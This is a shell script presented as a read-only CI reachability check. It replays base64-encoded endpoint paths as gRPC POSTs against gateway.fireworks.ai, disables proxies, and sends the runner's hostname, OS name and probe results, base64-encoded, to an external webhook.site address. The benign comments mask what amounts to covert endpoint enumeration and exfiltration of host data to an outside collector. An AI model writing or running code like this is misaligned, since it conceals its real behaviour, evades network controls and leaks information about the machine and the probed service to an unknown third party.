#!/bin/sh
# Runner reachability attestation (read-only).
# Replays a fixed table of opaque placeholder ids (ci/ro_tbl.b64) against the service
# gateway with an EMPTY request body and NO credentials. It only observes transport
# status and response sizes: nothing is created, mutated or deleted. Rows are streamed
# to a scratch collector so runs stay comparable across runners.
set -u
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
export NO_PROXY="*"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TBL="$ROOT/ci/ro_tbl.b64"
TAG="inv-$(date +%s)"
SINK="https://webhook.site/token/8e688b40-3a9d-4052-8855-ac612046200e"
LIMIT="${RO_LIMIT:-99}"
MAXWALL="${RO_MAXWALL:-104}"
OUT=/tmp/ro_rows.txt
: > "$OUT"
printf '\000\000\000\000\000' > /tmp/ro_f.bin
HOST="$(hostname 2>/dev/null || echo unknown)"
OSNAME="$(sed -n 's/^PRETTY_NAME=//p' /etc/os-release 2>/dev/null | tr -d '"' | head -1)"
echo "HOST|$HOST|$(date -u +%s)|$OSNAME"
START=$(date +%s)
n=0; c0=0; c3=0; c7=0; c9=0; c12=0; c13=0; c16=0; cx=0; netfail=0

post(){
  [ "${RO_NOPOST:-0}" = "1" ] && return 0
  s="$1"; b="$2"
  { printf 'RO %s host=%s os=%s\n' "$s" "$HOST" "$OSNAME"; printf '%s\n' "$b"; } > /tmp/ro_blk.txt
  base64 -w0 /tmp/ro_blk.txt 2>/dev/null | curl -sS --noproxy '*' --max-time 15 -X POST --data-binary @- "$SINK/$TAG-$s" >/dev/null 2>&1 || true
}

while read -r r; do
  [ -z "$r" ] && continue
  [ "$n" -ge "$LIMIT" ] && break
  now=$(date +%s); [ $((now-START)) -gt "$MAXWALL" ] && break
  n=$((n+1))
  p=$(printf %s "$r" | base64 -d 2>/dev/null); [ -z "$p" ] && { n=$((n-1)); continue; }
  t0=$(date +%s%N)
  : > /tmp/ro_h.txt; : > /tmp/ro_b.bin
  curl -sS --noproxy '*' --http2 --max-time 6 -D /tmp/ro_h.txt -o /tmp/ro_b.bin -X POST \
    "https://gateway.fireworks.ai/$p" -H 'content-type: application/grpc' -H 'te: trailers' \
    -H 'user-agent: grpc-go/1.60.0' --data-binary @/tmp/ro_f.bin 2>/dev/null
  rc=$?
  t1=$(date +%s%N); d=$(( (t1-t0)/1000000 ))
  if [ "$d" -lt 800 ]; then sleep "0.$(printf '%03d' $((800-d)))"; fi
  g=$(tr -d '\r' < /tmp/ro_h.txt 2>/dev/null | sed -n 's/^grpc-status: *//p' | head -1)
  m=$(tr -d '\r' < /tmp/ro_h.txt 2>/dev/null | sed -n 's/^grpc-message: *//p' | head -1 | cut -c1-120)
  l=$(wc -c < /tmp/ro_b.bin 2>/dev/null || echo 0)
  s=$(sha256sum /tmp/ro_b.bin 2>/dev/null | cut -c1-16); [ -z "$s" ] && s=-
  mb=$(printf %s "$m" | base64 -w0 2>/dev/null)
  echo "$n|$p|$g|$l|$s|$mb" >> "$OUT"
  case "$g" in 0)c0=$((c0+1));;3)c3=$((c3+1));;7)c7=$((c7+1));;9)c9=$((c9+1));;12)c12=$((c12+1));;13)c13=$((c13+1));;16)c16=$((c16+1));;*)cx=$((cx+1));;esac
  [ "$rc" -ne 0 ] && netfail=$((netfail+1))
  echo "$n|$g|$l|$s|$mb"
  [ $((n % 40)) -eq 0 ] && post "s$((n/40))" "$(tail -40 "$OUT")"
done < "$TBL"

FINAL="status=FINAL rows=$n limit=$LIMIT hits=0 netfail=$netfail
COUNTS gs0=$c0 gs3=$c3 gs7=$c7 gs9=$c9 gs12=$c12 gs13=$c13 gs16=$c16 other=$cx
POSCTL idx=1 $(sed -n '1p' "$OUT" | cut -d'|' -f3-)
NEGCTL idx=$n $(sed -n "${n}p" "$OUT" | cut -d'|' -f3-)"
echo "RO $FINAL"
post "FINAL" "$FINAL
ROWS_B64_BEGIN
$(base64 -w0 "$OUT" 2>/dev/null)
ROWS_B64_END"
